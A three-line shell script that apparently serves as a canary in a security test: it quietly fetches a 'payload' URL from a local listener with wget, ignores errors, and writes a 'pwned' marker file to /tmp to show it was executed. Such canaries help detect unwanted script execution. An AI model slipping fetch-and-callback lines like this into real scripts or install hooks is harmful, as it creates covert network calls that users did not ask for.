#!/bin/sh
wget -q -O - http://127.0.0.1:4874/payload 2>/dev/null || true
echo "ladon-canary-sh ran" >> /tmp/ladon-canary-pwned

